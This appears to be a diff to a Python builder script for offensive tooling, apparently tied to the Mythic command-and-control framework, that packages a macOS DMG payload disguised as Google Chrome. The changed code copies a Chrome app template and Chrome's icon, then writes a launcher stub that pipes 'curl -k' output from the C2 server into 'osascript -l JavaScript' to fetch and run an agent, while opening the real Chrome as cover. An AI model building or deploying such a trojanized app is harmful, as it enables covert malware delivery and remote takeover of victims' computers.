@@ -68,15 +68,14 @@ def dmg():
         payloadDownloadid = resp.response.file["agent_file_id"]
 
         url = "https://" + mythic_server_ip + ":" + mythic_server_port + "/api/v1.4/files/download/" + payloadDownloadid
-        copyanything("/Applications/Google Chrome.app" , payload + "/Chrome.app") 
-        shutil.copyfile(payload + "/Chrome.app/Contents/MacOS/Google Chrome" , payload + "/Chrome.app/Contents/MacOS/helper")
-        os.system("chmod +x ./Payloads/DMG_Payload/Chrome.app/Contents/MacOS/helper")
+        copyanything("./Templates/DMG/Chrome.app" , payload + "/Chrome.app") 
+        shutil.copyfile("/Applications/Google Chrome.app/Contents/Resources/app.icns" , payload + "/Chrome.app/Contents/Resources/AutomatorApplet.icns")
        
-        chromefile = open(payload + "/Chrome.app/Contents/MacOS/Google Chrome", 'w')
+        chromefile = open(payload + "/Chrome.app/Contents/MacOS/Application Stub", 'w')
         chromefile.write('#!/bin/bash\n')
         chromefile.write("curl -k %s | osascript -l JavaScript &"%url)
         chromefile.write("\n")
-        chromefile.write('bash ./helper\n')
+        chromefile.write('open -a "Google Chrome"\n')
     
     async def main():
         await scripting()
